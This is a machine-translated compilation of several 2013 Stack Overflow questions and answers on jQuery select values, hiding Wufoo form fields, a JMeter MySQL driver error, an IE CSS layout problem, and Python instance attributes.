> 时间：2013-04-10T21:16:57.340
> 
> 标签：javascript, jquery, html

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:20:28.493

您可以这样做以选择所需的值

```
 $('#select').val('yes'); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:22:38.110

停止尝试使用属性方法来操作属性！旧版本的 jQuery 允许您这样做，但新版本不会。

```
$('#select').children(':selected').prop("selected",false);
$('#select').children('option[value="yes"]').prop("selected",true);
//$('#select').children(':selected'); 
```

尽管`.val()`正如 Mohammad Adil 指出的那样，这是一种更好的处理方式。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-10T21:24:25.993

您不应使用该`selected`属性来更改选择的选项。相反，请使用`selectedIndex`您的 dropdwn 的属性。

例如，在您的情况下，您可能想要这样：

```
document.getElementById('select').selectedIndex = 1; 
```

# javascript - 如何使用 javascript 隐藏和显示表单文本字段

> ID：15936593
> 
> 赞同：-1
> 
> 时间：2013-04-10T21:16:57.537
> 
> 标签：javascript, html

I have this code, it hides some of the form textfields when the second value of drop down menue is selected.

问题是我如何根据下面提供的代码将更多文本字段添加到我想要隐藏和显示的 html 表单后编辑此 javascript 代码：

```
 <form id="form5" name="form5" class="wufoo topLabel page1" autocomplete="off" enctype="multipart/form-data" method="post" novalidate
action="#">

<header id="header" class="info">
<h2>Personal Shopper Order Form</h2>
<div>Place your order by filling this form</div>
</header>

<ul class="running">

<li class="total">
<output id="lola">
</output>
</li>

<li id="fo5li1" class="notranslate       ">
<label class="desc" id="title1" for="Field1">
Choose a plan
<span id="req_1" class="req">*</span>
</label>
<div>
<select id="Field1" name="Field1" class="field select medium" onclick="handleInput(this);" onkeyup="handleInput(this);" tabindex="1" > 
<option value="Lite Plan $0 per order" selected="selected">
Lite Plan $0 per order
</option>
<option value="Pro Plan $10 per order" >
Pro Plan $10 per order
</option>
</select>
</div>
<p class="instruct" id="instruct1"><small>Lite plan for order with a single item, Pro plan for order with up to 3 items per order.</small></p>
</li>

<li id="fo5li3" class="notranslate      ">
<label class="desc" id="title3" for="Field3">
Item #1 Name
<span id="req_3" class="req">*</span>
</label>
<div>
<input id="Field3" name="Field3" type="text" class="field text medium" value="" maxlength="100" tabindex="2" onkeyup="handleInput(this); validateRange(3, 'character');" onchange="handleInput(this);" required />
<label for="Field3">Must be between <var id="rangeMinMsg3">4</var> and <var id="rangeMaxMsg3">100</var> characters.&nbsp;&nbsp;&nbsp; <em class="currently">Currently Used: <var id="rangeUsedMsg3">0</var> characters.</em></label>
</div>
<p class="instruct" id="instruct3"><small>Item name such as "iPad3 32GB wifi & 3G.</small></p>
</li>

<li id="fo5li2" class="notranslate      ">
<label class="desc" id="title2" for="Field2">
Item #1 Price
<span id="req_2" class="req">*</span>
</label>
<span class="symbol">$</span>
<span>
<input id="Field2" name="Field2" type="text" class="field text currency nospin" value="" size="10" tabindex="3" onkeyup="handleInput(this);" onchange="handleInput(this);" required />
<label for="Field2">Dollars</label>
</span>
<span class="symbol radix">.</span>
<span class="cents">
<input id="Field2-1" name="Field2-1" type="text" class="field text nospin" value="" size="2" maxlength="2" tabindex="4" onkeyup="handleInput(this);" onchange="handleInput(this);" />
<label for="Field2-1">Cents</label>
</span>
<p class="instruct" id="instruct2"><small>Item(s) Price as listed on the US online store.</small></p>
</li>

<li id="fo5li4" class="notranslate      hide">
<label class="desc" id="title4" for="Field4">
Item #2 Name
<span id="req_4" class="req">*</span>
</label>
<div>
<input id="Field4" name="Field4" type="text" class="field text medium" value="" maxlength="100" tabindex="5" onkeyup="handleInput(this); validateRange(4, 'character');" onchange="handleInput(this);" required />
<label for="Field4">Must be between <var id="rangeMinMsg4">4</var> and <var id="rangeMaxMsg4">100</var> characters.&nbsp;&nbsp;&nbsp; <em class="currently">Currently Used: <var id="rangeUsedMsg4">0</var> characters.</em></label>
</div>
<p class="instruct" id="instruct4"><small>Item name such as "iPad3 32GB wifi & 3G.</small></p>
</li>

<li id="fo5li6" class="notranslate      hide">
<label class="desc" id="title6" for="Field6">
Item #2 Price
<span id="req_6" class="req">*</span>
</label>
<span class="symbol">$</span>
<span>
<input id="Field6" name="Field6" type="text" class="field text currency nospin" value="" size="10" tabindex="6" onkeyup="handleInput(this);" onchange="handleInput(this);" required />
<label for="Field6">Dollars</label>
</span>
<span class="symbol radix">.</span>
<span class="cents">
<input id="Field6-1" name="Field6-1" type="text" class="field text nospin" value="" size="2" maxlength="2" tabindex="7" onkeyup="handleInput(this);" onchange="handleInput(this);" />
<label for="Field6-1">Cents</label>
</span>
</li>

<li id="fo5li4" class="notranslate      hide">
<label class="desc" id="title4" for="Field14">
Item #3 Name
<span id="req_4" class="req">*</span>
</label>
<div>
<input id="Field4" name="Field14" type="text" class="field text medium" value="" maxlength="100" tabindex="5" onkeyup="handleInput(this); validateRange(4, 'character');" onchange="handleInput(this);" required />
<label for="Field4">Must be between <var id="rangeMinMsg4">4</var> and <var id="rangeMaxMsg4">100</var> characters.&nbsp;&nbsp;&nbsp; <em class="currently">Currently Used: <var id="rangeUsedMsg4">0</var> characters.</em></label>
</div>
<p class="instruct" id="instruct4"><small>Item name such as "iPad3 32GB wifi & 3G.</small></p>
</li>

<li id="fo5li6" class="notranslate      hide">
<label class="desc" id="title6" for="Field16">
Item #3 Price
<span id="req_6" class="req">*</span>
</label>
<span class="symbol">$</span>
<span>
<input id="Field6" name="Field16" type="text" class="field text currency nospin" value="" size="10" tabindex="6" onkeyup="handleInput(this);" onchange="handleInput(this);" required />
<label for="Field6">Dollars</label>
</span>
<span class="symbol radix">.</span>
<span class="cents">
<input id="Field16-1" name="Field16-1" type="text" class="field text nospin" value="" size="2" maxlength="2" tabindex="7" onkeyup="handleInput(this);" onchange="handleInput(this);" />
<label for="Field6-1">Cents</label>
</span>
</li>

<li id="fo5li8" class="notranslate section      ">
<section>
<h3 id="title8">
Personal Information
</h3>
<div id="instruct8">Shipping address where your packages will be shipped to!</div>
</section>
</li>

<li id="fo5li9" class="date notranslate      ">
<label class="desc" id="title9" for="Field9">
Date
</label>
<span>
<input id="Field9-1" name="Field9-1" type="text" class="field text" value="" size="2" maxlength="2" tabindex="8" onkeyup="handleInput(this);" onchange="handleInput(this);" />
<label for="Field9-1">MM</label>
</span> 
<span class="symbol">/</span>
<span>
<input id="Field9-2" name="Field9-2" type="text" class="field text" value="" size="2" maxlength="2" tabindex="9" onkeyup="handleInput(this);" onchange="handleInput(this);" />
<label for="Field9-2">DD</label>
</span>
<span class="symbol">/</span>
<span>
 <input id="Field9" name="Field9" type="text" class="field text" value="" size="4" maxlength="4" tabindex="10" onkeyup="handleInput(this);" onchange="handleInput(this);" />
<label for="Field9">YYYY</label>
</span>
<span id="cal9">
<img id="pick9" class="datepicker" src="/images/icons/calendar.png" alt="Pick a date." />
</span>
</li>

<li id="fo5li10" class="notranslate  notStacked     ">
<fieldset>
<![if !IE | (gte IE 8)]>
<legend id="title10" class="desc">
Gender
<span id="req_10" class="req">*</span>
</legend>
<![endif]>
<!--[if lt IE 8]>
<label id="title10" class="desc">
Gender
<span id="req_10" class="req">*</span>
</label>
<![endif]-->
<div>
<input id="radioDefault_10" name="Field10" type="hidden" value="" />
<span>
<input id="Field10_0" name="Field10" type="radio" class="field radio" value="Male" tabindex="11" onchange="handleInput(this);" onmouseup="handleInput(this);" checked="checked"  
required />
<label class="choice" for="Field10_0" >
Male</label>
</span>
<span>
<input id="Field10_1" name="Field10" type="radio" class="field radio" value="Female" tabindex="12" onchange="handleInput(this);" onmouseup="handleInput(this);" required />
<label class="choice" for="Field10_1" >
Female</label>
</span>
</div>
</fieldset>
</li>

<li id="fo5li11" class="complex notranslate      ">
<label class="desc" id="title11" for="Field11">
Address
<span id="req_11" class="req">*</span>
</label>
<div>
<span class="full addr1">
<input id="Field11" name="Field11" type="text" class="field text addr" value="" tabindex="13" onkeyup="handleInput(this);" onchange="handleInput(this);" required />
<label for="Field11">Street Address</label>
</span>
<span class="full addr2">
<input id="Field12" name="Field12" type="text" class="field text addr" value="" tabindex="14" onkeyup="handleInput(this);" onchange="handleInput(this);" />
<label for="Field12">Address Line 2</label>
</span>
<span class="left city">
<input id="Field13" name="Field13" type="text" class="field text addr" value="" tabindex="15" onkeyup="handleInput(this);" onchange="handleInput(this);" required />
<label for="Field13">City</label>
</span>
<span class="right state">
<input id="Field14" name="Field14" type="text" class="field text addr" value="" tabindex="16" onkeyup="handleInput(this);" onchange="handleInput(this);" required />
<label for="Field14">State / Province / Region</label>
</span>
<span class="left zip">
<input id="Field15" name="Field15" type="text" class="field text addr" value="" maxlength="15" tabindex="17" onkeyup="handleInput(this);" onchange="handleInput(this);" required />
<label for="Field15">Postal / Zip Code</label>
</span>
<span class="right country">
<select id="Field16" name="Field16" class="field select addr" tabindex="18" onclick="handleInput(this);" onkeyup="handleInput(this);" >
<option value="" selected="selected"></option>
<option value="United States" >United States</option>
<option value="United Kingdom" >United Kingdom</option>
<option value="Australia" >Australia</option>
<option value="Canada" >Canada</option>
<option value="France" >France</option>
<option value="New Zealand" >New Zealand</option>
<option value="India" >India</option>
<option value="Brazil" >Brazil</option>
<option value="----" >----</option>
<option value="Afghanistan" >Afghanistan</option>
<option value="Åland Islands" >Åland Islands</option>
<option value="Albania" >Albania</option>
<option value="Algeria" >Algeria</option>
<option value="American Samoa" >American Samoa</option>
<option value="Andorra" >Andorra</option>
<option value="Angola" >Angola</option>
<option value="Anguilla" >Anguilla</option>
<option value="Antarctica" >Antarctica</option>
<option value="Antigua and Barbuda" >Antigua and Barbuda</option>
<option value="Argentina" >Argentina</option>
<option value="Armenia" >Armenia</option>
<option value="Aruba" >Aruba</option>
<option value="Austria" >Austria</option>
<option value="Azerbaijan" >Azerbaijan</option>
<option value="Bahamas" >Bahamas</option>
<option value="Bahrain" >Bahrain</option>
<option value="Bangladesh" >Bangladesh</option>
<option value="Barbados" >Barbados</option>
<option value="Belarus" >Belarus</option>
<option value="Belgium" >Belgium</option>
<option value="Belize" >Belize</option>
<option value="Benin" >Benin</option>
<option value="Bermuda" >Bermuda</option>
<option value="Bhutan" >Bhutan</option>
<option value="Bolivia" >Bolivia</option>
<option value="Bosnia and Herzegovina" >Bosnia and Herzegovina</option>
<option value="Botswana" >Botswana</option>
<option value="British Indian Ocean Territory" >British Indian Ocean Territory</option>
<option value="Brunei Darussalam" >Brunei Darussalam</option>
<option value="Bulgaria" >Bulgaria</option>
<option value="Burkina Faso" >Burkina Faso</option>
<option value="Burundi" >Burundi</option>
<option value="Cambodia" >Cambodia</option>
<option value="Cameroon" >Cameroon</option>
<option value="Cape Verde" >Cape Verde</option>
<option value="Cayman Islands" >Cayman Islands</option>
<option value="Central African Republic" >Central African Republic</option>
<option value="Chad" >Chad</option>
<option value="Chile" >Chile</option>
<option value="China" >China</option>
<option value="Colombia" >Colombia</option>
<option value="Comoros" >Comoros</option>
<option value="Democratic Republic of the Congo" >Democratic Republic of the Congo</option>
<option value="Republic of the Congo" >Republic of the Congo</option>
<option value="Cook Islands" >Cook Islands</option>
<option value="Costa Rica" >Costa Rica</option>
<option value="C&ocirc;te d'Ivoire" >C&ocirc;te d'Ivoire</option>
<option value="Croatia" >Croatia</option>
<option value="Cuba" >Cuba</option>
<option value="Cyprus" >Cyprus</option>
<option value="Czech Republic" >Czech Republic</option>
<option value="Denmark" >Denmark</option>
<option value="Djibouti" >Djibouti</option>
<option value="Dominica" >Dominica</option>
<option value="Dominican Republic" >Dominican Republic</option>
<option value="East Timor" >East Timor</option>
<option value="Ecuador" >Ecuador</option>
<option value="Egypt" >Egypt</option>
<option value="El Salvador" >El Salvador</option>
<option value="Equatorial Guinea" >Equatorial Guinea</option>
<option value="Eritrea" >Eritrea</option>
<option value="Estonia" >Estonia</option>
<option value="Ethiopia" >Ethiopia</option>
<option value="Faroe Islands" >Faroe Islands</option>
<option value="Fiji" >Fiji</option>
<option value="Finland" >Finland</option>
<option value="Gabon" >Gabon</option>
<option value="Gambia" >Gambia</option>
<option value="Georgia" >Georgia</option>
<option value="Germany" >Germany</option>
<option value="Ghana" >Ghana</option>
<option value="Gibraltar" >Gibraltar</option>
<option value="Greece" >Greece</option>
<option value="Grenada" >Grenada</option>
<option value="Guatemala" >Guatemala</option>
<option value="Guinea" >Guinea</option>
<option value="Guinea-Bissau" >Guinea-Bissau</option>
<option value="Guyana" >Guyana</option>
<option value="Haiti" >Haiti</option>
<option value="Honduras" >Honduras</option>
<option value="Hong Kong" >Hong Kong</option>
<option value="Hungary" >Hungary</option>
<option value="Iceland" >Iceland</option>
<option value="Indonesia" >Indonesia</option>
<option value="Iran" >Iran</option>
<option value="Iraq" >Iraq</option>
<option value="Ireland" >Ireland</option>
<option value="Israel" >Israel</option>
<option value="Italy" >Italy</option>
<option value="Jamaica" >Jamaica</option>
<option value="Japan" >Japan</option>
<option value="Jordan" >Jordan</option>
<option value="Kazakhstan" >Kazakhstan</option>
<option value="Kenya" >Kenya</option>
<option value="Kiribati" >Kiribati</option>
<option value="North Korea" >North Korea</option>
<option value="South Korea" >South Korea</option>
<option value="Kuwait" >Kuwait</option>
<option value="Kyrgyzstan" >Kyrgyzstan</option>
<option value="Laos" >Laos</option>
<option value="Latvia" >Latvia</option>
<option value="Lebanon" >Lebanon</option>
<option value="Lesotho" >Lesotho</option>
<option value="Liberia" >Liberia</option>
<option value="Libya" >Libya</option>
<option value="Liechtenstein" >Liechtenstein</option>
<option value="Lithuania" >Lithuania</option>
<option value="Luxembourg" >Luxembourg</option>
<option value="Macedonia" >Macedonia</option>
<option value="Madagascar" >Madagascar</option>
<option value="Malawi" >Malawi</option>
<option value="Malaysia" >Malaysia</option>
<option value="Maldives" >Maldives</option>
<option value="Mali" >Mali</option>
<option value="Malta" >Malta</option>
<option value="Marshall Islands" >Marshall Islands</option>
<option value="Mauritania" >Mauritania</option>
<option value="Mauritius" >Mauritius</option>
<option value="Mexico" >Mexico</option>
<option value="Micronesia" >Micronesia</option>
<option value="Moldova" >Moldova</option>
<option value="Monaco" >Monaco</option>
<option value="Mongolia" >Mongolia</option>
<option value="Montenegro" >Montenegro</option>
<option value="Morocco" >Morocco</option>
<option value="Mozambique" >Mozambique</option>
<option value="Myanmar" >Myanmar</option>
<option value="Namibia" >Namibia</option>
<option value="Nauru" >Nauru</option>
<option value="Nepal" >Nepal</option>
<option value="Netherlands" >Netherlands</option>
<option value="Netherlands Antilles" >Netherlands Antilles</option>
<option value="Nicaragua" >Nicaragua</option>
<option value="Niger" >Niger</option>
<option value="Nigeria" >Nigeria</option>
<option value="Norway" >Norway</option>
<option value="Oman" >Oman</option>
<option value="Pakistan" >Pakistan</option>
<option value="Palau" >Palau</option>
<option value="Palestine" >Palestine</option>
<option value="Panama" >Panama</option>
<option value="Papua New Guinea" >Papua New Guinea</option>
<option value="Paraguay" >Paraguay</option>
<option value="Peru" >Peru</option>
<option value="Philippines" >Philippines</option>
<option value="Poland" >Poland</option>
<option value="Portugal" >Portugal</option>
<option value="Puerto Rico" >Puerto Rico</option>
<option value="Qatar" >Qatar</option>
<option value="Romania" >Romania</option>
<option value="Russia" >Russia</option>
<option value="Rwanda" >Rwanda</option>
<option value="Saint Kitts and Nevis" >Saint Kitts and Nevis</option>
<option value="Saint Lucia" >Saint Lucia</option>
<option value="Saint Vincent and the Grenadines" >Saint Vincent and the Grenadines</option>
<option value="Samoa" >Samoa</option>
<option value="San Marino" >San Marino</option>
<option value="Sao Tome and Principe" >Sao Tome and Principe</option>
<option value="Saudi Arabia" >Saudi Arabia</option>
<option value="Senegal" >Senegal</option>
<option value="Serbia" >Serbia</option>
<option value="Seychelles" >Seychelles</option>
<option value="Sierra Leone" >Sierra Leone</option>
<option value="Singapore" >Singapore</option>
<option value="Slovakia" >Slovakia</option>
<option value="Slovenia" >Slovenia</option>
<option value="Solomon Islands" >Solomon Islands</option>
<option value="Somalia" >Somalia</option>
<option value="South Africa" >South Africa</option>
<option value="Spain" >Spain</option>
<option value="Sri Lanka" >Sri Lanka</option>
<option value="Sudan" >Sudan</option>
<option value="Suriname" >Suriname</option>
<option value="Swaziland" >Swaziland</option>
<option value="Sweden" >Sweden</option>
<option value="Switzerland" >Switzerland</option>
<option value="Syria" >Syria</option>
<option value="Taiwan" >Taiwan</option>
<option value="Tajikistan" >Tajikistan</option>
<option value="Tanzania" >Tanzania</option>
<option value="Thailand" >Thailand</option>
<option value="Togo" >Togo</option>
<option value="Tonga" >Tonga</option>
<option value="Trinidad and Tobago" >Trinidad and Tobago</option>
<option value="Tunisia" >Tunisia</option>
<option value="Turkey" >Turkey</option>
<option value="Turkmenistan" >Turkmenistan</option>
<option value="Tuvalu" >Tuvalu</option>
<option value="Uganda" >Uganda</option>
<option value="Ukraine" >Ukraine</option>
<option value="United Arab Emirates" >United Arab Emirates</option>
<option value="United States Minor Outlying Islands" >United States Minor Outlying Islands</option>
<option value="Uruguay" >Uruguay</option>
<option value="Uzbekistan" >Uzbekistan</option>
<option value="Vanuatu" >Vanuatu</option>
<option value="Vatican City" >Vatican City</option>
<option value="Venezuela" >Venezuela</option>
<option value="Vietnam" >Vietnam</option>
<option value="Virgin Islands, British" >Virgin Islands, British</option>
<option value="Virgin Islands, U.S." >Virgin Islands, U.S.</option>
<option value="Yemen" >Yemen</option>
<option value="Zambia" >Zambia</option>
<option value="Zimbabwe" >Zimbabwe</option>
</select>
<label for="Field16">Country</label>
</span>
</div>
</li>

<li id="fo5li17" class="notranslate      ">
<label class="desc" id="title17" for="Field17">
Email
</label>
<div>
<input id="Field17" name="Field17" type="email" spellcheck="false" class="field text medium" value="" maxlength="255" tabindex="19" onkeyup="handleInput(this);" onchange="handleInput(this);" /> 
</div>
</li>

<li class="buttons ">
<div>
<input type="hidden" name="currentPage" id="currentPage" value="hrrPrWZVP1AZJEJQzZtacb98R0HanwMV1y1wuBeO5wuslashRLQ8=" />

                    <input id="saveForm" name="saveForm" class="btTxt submit" 
    type="submit" value="Submit"
 onmousedown="doSubmitEvents();" />

<a href="https://master.wufoo.com/forms/m7p0x3/def/field1=shopandship.wufoo.com/forms/personal-shopper-order-form/"
target="_blank"
style="font-size:85% !important;visibility:visible !important;display:inline !important;
background:none !important;border:none !important;color:blue !important;
text-indent:0 !important;text-decoration:underline !important;position:static !important;
margin:0 !important;padding:0 !important;overflow:none !important
width:auto !important;height:auto !important;">Report Abuse</a>
</div>
</li>

<li class="hide">
<label for="comment">Do Not Fill This Out</label>
<textarea name="comment" id="comment" rows="1" cols="1"></textarea>
<input type="hidden" id="idstamp" name="idstamp" value="2kFNZeuYuz6lYe9uHWYSc2f1+Ee+ilanB5I5soK26Ek=" />
<input type="hidden" id="stats" name="stats" value="{&quot;errors&quot;:0,&quot;startTime&quot;:0,&quot;endTime&quot;:0,&quot;referer&quot;:null}" />
<input type="hidden" id="clickOrEnter" name="clickOrEnter" value="" />
</li>
</ul>
</form>

   <script>
__RULES = {"Field1":[{"RuleId":"36","Type":"Hide","Setting":{"FieldName":"4","FieldTypes":{"1":"select"}},"FormId":"5","MatchType":"any","Conditions":[{"ConditionId":"60","FieldName":"1","Filter":"is","Value":"Lite Plan $0 per order","ReportId":"5","RuleId":"36"}]},{"RuleId":"37","Type":"Hide","Setting":{"FieldName":"6","FieldTypes":{"1":"select"}},"FormId":"5","MatchType":"any","Conditions":[{"ConditionId":"61","FieldName":"1","Filter":"is","Value":"Lite Plan $0 per order","ReportId":"5","RuleId":"37"}]}]};
__ENTRY = [];
__PRICES = {"ShowRunningTotal":true,"BasePrice":"0.00","Currency":"&#36;","Decimals":2,"BasePriceName":"Pre\u00e7o base","TotalText":"Total","MerchantFields":[{"Title":"Choose a plan","Typeof":"select","ColumnId":"1","Price":"0","ChoicesText":"0","Choices":{"369":{"ColumnId":"1","ChoiceId":"369","Choice":"Lite Plan $0 per order","Price":"0","Score":1},"370":{"ColumnId":"1","ChoiceId":"370","Choice":"Pro Plan $10 per order","Price":"10","Score":2}},"DisplaySetting":""},{"Title":"Item #1 Price","Typeof":"money","ColumnId":"2","Price":"1","ChoicesText":"0","DisplaySetting":""},{"Title":"Item #2 Price","Typeof":"money","ColumnId":"6","Price":"1","ChoicesText":"0","DisplaySetting":""}],"BasePriceText":"Pre\u00e7o base"};

</script> 
```

魔术代码位于 java 脚本代码中的规则下，如何将此功能添加到表单的新文本字段中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-28T20:33:05.537

使用 jquery 的更改功能并根据所选值隐藏/显示您想要的任何内容。
我的示例检查选择了哪个选项，第一个添加了一个具有单击事件的新按钮，第二个选项添加了另一个按钮和单击事件以隐藏所有按钮。我希望这很有用，这只是我第二次尝试使用 stackoverflow 来提供帮助。

```
 <!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Using Functions</title>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script>
    $(document).ready(function () {
      $("select").change(function () {
        var value = $('#Field1 option:selected').val();
        if(value=='Lite Plan $0 per order'){
            alert("Selected value= " + value );
            $('div').append(value+'<button type="button">change again</button>');
            $('button').click(function(){
                $('#Field1').hide().fadeOut(3000);
                $('#Field1').fadeIn();
            });
        }
        else{
            alert("other value= " + value ); 
            $('div').append(value+'<button type="button">change again</button>');
            $('button').click(function(){
                $('button').hide();
            });
        }
      });
    });

</script>
</head>
<body>
<div>
    <select id="Field1" name="Field1" class="field select medium" > 
        <option></option>
            <option>
            Lite Plan $0 per order
            </option>
            <option>
            Pro Plan $10 per order
        </option>
    </select>
    </div>
</body>
</html>

enter code here 
```

# java - JMeter jdbc：mysql错误

> ID：15936595
> 
> 赞同：1
> 
> 时间：2013-04-10T21:17:11.740
> 
> 标签：java, jdbc, jmeter, mysql-connector

我正在尝试`JMeter`在远程数据库服务器上设置服务器/客户端实例。我已经`JMeter`在服务器上提取，将 MySQL java 连接器复制到 $JMETER_HOME/lib 并启动`JMeter`-server 侦听器。在客户端（我的本地桌面）上，我已将`JMeter`客户端指向远程服务器（通过 $JMETER_HOME/bin/jmeter.properties 中的 remote_hosts 条目）。每当我尝试在客户端上运行 MySQL 加载作业（运行 -> 远程启动 -> ）时，我都会收到以下错误：

> 响应消息：java.sql.SQLException：找不到适合 jdbc:mysql://1.2.3.4/database 的驱动程序

这是在服务器端：

> 2013/04/10 12:44:43 警告 - jmeter.protocol.jdbc.config.DataSourceElement: 无法返回连接 java.sql.SQLException: 在 java 中找不到 jdbc:mysql://1.2.3.4/dbname 的合适驱动程序.sql.DriverManager.getConnection(DriverManager.java:602) at java.sql.DriverManager.getConnection(DriverManager.java:185) at org.apache.avalon.excalibur.datasource.JdbcConnectionFactory.newInstance(JdbcConnectionFactory.java:185) at org.apache.avalon.excalibur.pool.ResourceLimitingPool.newPoolable(ResourceLimitingPool.java:672) 在 org.apache.avalon.excalibur.pool.ValidatedResourceLimitingPool.newPoolable(ValidatedResourceLimitingPool.java:178) 在 org.apache.avalon.excalibur。 datasource.ResourceLimitingJdbcConnectionPool.newPoolable(ResourceLimitingJdbcConnectionPool.java:123) 在 org.apache.avalon.excalibur.pool.ResourceLimitingPool.get(ResourceLimitingPool.java:402) 在 org.apache.avalon.excalibur.datasource.ResourceLimitingJdbcDataSource.getConnection(ResourceLimitingJdbcDataSource.java:222) 在 org.apache.jmeter 的 org.apache.avalon.excalibur.pool.ValidatedResourceLimitingPool.get(ValidatedResourceLimitingPool.java:130) .protocol.jdbc.config.DataSourceElement$DataSourceComponentImpl.getConnection(DataSourceElement.java:286) 在 org.apache.jmeter.protocol.jdbc.config.DataSourceElement.getConnection(DataSourceElement.java:146) 在 org.apache.jmeter.protocol .jdbc.sampler.JDBCSampler.sample(JDBCSampler.java:85) 在 org.apache.jmeter.threads.JMeterThread.process_sampler(JMeterThread.java:428) 在 org.apache.jmeter.threads.JMeterThread.run(JMeterThread.java :256) 在 java.lang.Thread.run(Thread.java:662)130）在 org.apache.avalon.excalibur.datasource.ResourceLimitingJdbcDataSource.getConnection(ResourceLimitingJdbcDataSource.java:222) 在 org.apache.jmeter.protocol.jdbc.config.DataSourceElement$DataSourceComponentImpl.getConnection(DataSourceElement.java:286) 在 org .apache.jmeter.protocol.jdbc.config.DataSourceElement.getConnection(DataSourceElement.java:146) 在 org.apache.jmeter.protocol.jdbc.sampler.JDBCSampler.sample(JDBCSampler.java:85) 在 org.apache.jmeter .threads.JMeterThread.process_sampler(JMeterThread.java:428) 在 org.apache.jmeter.threads.JMeterThread.run(JMeterThread.java:256) 在 java.lang.Thread.run(Thread.java:662)130）在 org.apache.avalon.excalibur.datasource.ResourceLimitingJdbcDataSource.getConnection(ResourceLimitingJdbcDataSource.java:222) 在 org.apache.jmeter.protocol.jdbc.config.DataSourceElement$DataSourceComponentImpl.getConnection(DataSourceElement.java:286) 在 org .apache.jmeter.protocol.jdbc.config.DataSourceElement.getConnection(DataSourceElement.java:146) 在 org.apache.jmeter.protocol.jdbc.sampler.JDBCSampler.sample(JDBCSampler.java:85) 在 org.apache.jmeter .threads.JMeterThread.process_sampler(JMeterThread.java:428) 在 org.apache.jmeter.threads.JMeterThread.run(JMeterThread.java:256) 在 java.lang.Thread.run(Thread.java:662)getConnection(DataSourceElement.java:286) 在 org.apache.jmeter.protocol.jdbc.config.DataSourceElement.getConnection(DataSourceElement.java:146) 在 org.apache.jmeter.protocol.jdbc.sampler.JDBCSampler.sample(JDBCSampler. java:85) at org.apache.jmeter.threads.JMeterThread.process_sampler(JMeterThread.java:428) at org.apache.jmeter.threads.JMeterThread.run(JMeterThread.java:256) at java.lang.Thread.run （线程.java：662）getConnection(DataSourceElement.java:286) 在 org.apache.jmeter.protocol.jdbc.config.DataSourceElement.getConnection(DataSourceElement.java:146) 在 org.apache.jmeter.protocol.jdbc.sampler.JDBCSampler.sample(JDBCSampler. java:85) at org.apache.jmeter.threads.JMeterThread.process_sampler(JMeterThread.java:428) at org.apache.jmeter.threads.JMeterThread.run(JMeterThread.java:256) at java.lang.Thread.run （线程.java：662）

有谁知道为什么即使 Java 连接器位于 jmeter lib 目录中，这也不起作用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T04:28:54.510

所以事实证明，我们正在运行的 Percona MySQL 版本需要特定版本的连接器。把它放进去，一切都解决了。

# css - IE 的 Wordpress / 960 网格问题

> ID：15936597
> 
> 赞同：0
> 
> 时间：2013-04-10T21:17:14.647
> 
> 标签：css, wordpress, internet-explorer, 960.gs

我在 Internet Explorer 中的网站样式有问题，

该网站在 Chrome、Safari、Firefox (windows/apple) 中看起来很完美，但 IE 无法正确获取 css，

**图片在下面的评论中**

[http://rikvandoorn.nl/waldorf](http://rikvandoorn.nl/waldorf)

谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-08T12:05:38.620

问题已经解决了.. IE 只有 css 的宽度为 960px，此设置为 100% 它已解决

# python - Python 中特定于实例的字段的成本与收益

> ID：15936615
> 
> 赞同：3
> 
> 时间：2013-04-10T21:18:46.357
> 
> 标签：python, oop, duck-typing

所以，Python 很高兴我能写出这样的代码，

```
class A(): pass

a1 = A()
a2 = A()
a1.some_field = 5
a2.other_field = 7 
```

现在，在将对象传递给方法时，我已经学会了停止担心并喜欢鸭子类型。而且我接受允许一个类的不同实例具有不同的字段有时会很方便。

我的问题是，我正在与一个由 4 名开发人员组成的团队构建一个中型 Web 应用程序，我不禁认为向对象添加任意字段会使推理应用程序状态变得更加困难。

我想我的问题是：向对象添加任意字段的做法只是鸭子类型的自然扩展，还是应该避免？

这是一个具体的例子：

```
class Visitor():
    def __init__(self, name, address, dob):
        self.name = name
        self.address = address
        self.dob = dob

    def summarize_visits(visits):
        self.most_recent_visit = find_most_recent_visit(visits) 
```

在这种情况下，处理对象的代码必须意识到除非有人先前调用过同一个对象，否则会引发一个`Visitor`事实。似乎它会导致很多块，不是吗？`visitor.most_recent_visit``AttributeError``summarize_visits``if hasattr(...)`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:35:57.803

编写这样的代码实际上是 Python 的最大好处之一。我的经验法则是仅在内部使用特定于实例的字段（即在一个函数中，并且仅在必要时使用），而不是期望它们被外部模​​块使用。

如果我的对象预计会被另一个人使用，我希望他们查看类定义并找到他们需要了解的关于其结构的所有信息，并在一个地方清楚地描绘出来。记住，`explicit is better than implicit`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:26:45.143

这样做通常很方便，但我看到您担心与其他开发人员合作时可能会导致混乱。[您可以通过定义此处](https://stackoverflow.com/questions/472000/python-slots)`__slots__`讨论的变量来阻止人们向类添加任意值。这将迫使人们明确他们想要的对象属性，这有助于避免混淆。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T21:28:41.690

我相信这方面的 Python 术语是“猴子补丁”；以下是一些相关信息：

[Stack Overflow - 猴子补丁](https://stackoverflow.com/questions/5626193/what-is-monkey-patching)

这样做的一个好处是你的 python 代码是非常动态的；您可以添加字段来自定义类、模块或任何具有属性的 Python 构造。

一个非常聪明的用法是“Bunch”python 配方，它定义了一个可以使用关键字参数构造的通用容器：

[一堆食谱](http://code.activestate.com/recipes/52308-the-simple-but-handy-collector-of-a-bunch-of-named/)

成本在于潜在的维护问题；很难跟踪一个类或模块上次“猴子补丁”的位置。

当然，如果您真的喜欢鸭子类型，那么您的代码使用`some_field`并且`other_field`应该`try/except`确保属性确实存在，并处理这两种情况。

在您的具体示例中，似乎`Visitor.most_recent_visits`可以初始化为`None`，或其他一些哨兵。恕我直言，如果您可以将属性初始化为在构造函数中有意义的值，您应该这样做，并且只为极端情况保留“猴子补丁”。此外，库类和函数的猴子补丁似乎很麻烦。

* * *

## 回答 #4

> 赞同：0
> 
